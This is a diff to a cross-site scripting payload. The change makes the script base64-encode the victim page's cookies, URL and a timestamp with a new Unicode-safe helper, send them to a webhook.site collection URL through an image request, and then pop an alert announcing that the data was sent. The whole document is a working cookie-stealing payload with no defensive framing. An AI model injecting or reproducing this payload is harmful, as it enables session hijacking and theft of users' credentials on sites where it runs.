@@ -1,5 +1,9 @@
 <script>
-let data = btoa(`
+function toBase64Unicode(str) {
+  return btoa(unescape(encodeURIComponent(str)));
+}
+
+let data = `
 🍪 Cookies:
 ${document.cookie}
 
@@ -14,9 +18,9 @@ ${location.href}
 
 ⏰ Time:
 ${new Date().toISOString()}
-`);
+`;
 
-new Image().src = "https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb?data=" + data;
+new Image().src = "https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb?data=" + toBase64Unicode(data);
 
-alert("👾 XSS Triggered!");
+alert("✅ XSS Triggered & Data sent!");
 </script>
